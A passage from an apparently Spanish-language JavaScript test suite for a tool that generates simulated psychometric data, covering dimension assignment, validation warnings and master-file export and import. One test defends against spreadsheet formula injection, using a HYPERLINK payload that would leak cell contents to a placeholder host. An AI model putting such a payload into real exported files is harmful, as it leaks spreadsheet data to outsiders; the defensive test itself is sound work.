    env.disparar(inp, 'change');
    assert.equal(dueños(), 'Cognitivo→Beck | Somático→Beck | Afectivo→BDI-II | Conductual→BDI-II');
    // y si al salir del campo el nombre queda vacío, sin test, como siempre
    env.disparar(inp, 'focusin'); poner(inp, '', 'input'); env.disparar(inp, 'change');
    assert.equal(dueños(), 'Cognitivo→ | Somático→ | Afectivo→BDI-II | Conductual→BDI-II');
});

test('(segunda revisión) los errores y avisos de la validación, todos en la tarjeta bajo «Generar» (antes, solo el primero, y tapado)', async () => {
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'BAI', variable: 'Ansiedad', dimensiones: ['Ansiedad'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ Ansiedad: [8, 24, 5, 1, null, 0.85, 0] });   // sin máximo: escala continua con un solo límite
    poner(campo(filasPruebas()[0], 'Máximo por ítem'), '');
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Edad', distribucion: 'normal', promedio: '21', de: '3', min: '18', max: '', decimales: '0' });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino, Masculino' });
    q('#tamanoMuestra').value = '25';
    await generarYEsperar();
    const tarjeta = q('#avisosGeneracion');
    assert.notEqual(tarjeta.style.display, 'none');
    const items = tarjeta.querySelectorAll('li').map((/** @type {any} */ li) => li.textContent);
    assert.ok(items.length >= 3, items.join(' || '));
    assert.ok(items.some((/** @type {string} */ t) => /Tamaño muestral < 30/.test(t)));
    assert.ok(items.some((/** @type {string} */ t) => /tiene mínimo por ítem \(1\) pero no máximo/.test(t)));
    assert.ok(items.some((/** @type {string} */ t) => /«Edad»: con media 21 y DE 3, ≈ 16 % de los casos caería fuera del rango/.test(t)));
    assert.match(toast(), /avisos de la configuración: revísalos bajo «Generar»/);
    // sin avisos, la tarjeta se oculta
    rellenarEscalas({ Ansiedad: [8, 24, 5, 1, 5, 0.85, 0] });
    for (const id of ['bodySocio']) q('#' + id).innerHTML = '';
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino, Masculino' });
    q('#tamanoMuestra').value = '300';
    await generarYEsperar();
    const restantes = q('#avisosGeneracion').querySelectorAll('li').map((/** @type {any} */ li) => li.textContent);
    assert.ok(!restantes.some((/** @type {string} */ t) => /pero no máximo|Tamaño muestral < 30|«Edad»/.test(t)), restantes.join(' || '));
});

test('(segunda revisión) el bloque de la estructura factorial del maestro: sin fórmulas y de vuelta igual', async () => {
    const NOMBRE = '=HYPERLINK("http://x.example/?"&A1,"Ver")';
    ui.pruebas.agregarFilaTestConDatos({ prueba: NOMBRE, variable: 'Apoyo', dimensiones: ['Familia', 'Amigos'], rIntra: '0.45' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ Familia: [4, 12, 3, 1, 5, 0.8, 0], Amigos: [4, 12, 3, 1, 5, 0.8, 0] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino, Masculino' });
    ui.estructura.poblarSelectorEstructura(); q('#selectorTestEstructura').value = NOMBRE; ui.estructura.renderMatrizCargas(NOMBRE); ui.estructura.proponerCargas();
    const texto = await exportarMaestro();
    const bloque = texto.split('###ESTRUCTURA###')[1].split('###')[0].trim().split(/\r?\n/);
    assert.ok(bloque.length >= 2, texto.slice(0, 300));
    assert.ok(bloque.slice(1).every(l => /^"'=HYPERLINK/.test(l)), bloque.join(' | '));
    const antes = JSON.stringify(ui.estructura.estructurasUI[NOMBRE]);
    for (const id of TABLAS) q('#' + id).innerHTML = '';
    await importarMaestro(texto);
    assert.equal(JSON.stringify(ui.estructura.estructurasUI[NOMBRE]), antes);
});

